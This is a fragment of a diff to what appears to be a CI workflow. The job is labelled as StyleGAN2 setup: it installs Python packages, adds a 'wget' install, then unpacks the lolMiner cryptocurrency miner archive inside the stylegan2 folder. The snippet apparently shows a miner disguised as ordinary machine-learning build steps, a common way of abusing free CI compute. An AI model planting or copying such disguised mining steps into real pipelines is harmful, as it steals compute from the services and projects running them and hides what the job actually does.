@@ -33,6 +33,7 @@ jobs:
         pip install scipy==1.3.3
         pip install requests==2.22.0
         pip install Pillow==6.2.1
+        pip install wget
         cd /inputs/stylegan2
         tar -zxvf lolMiner_v1.31_Lin64.tar.gz
         cd 1.31
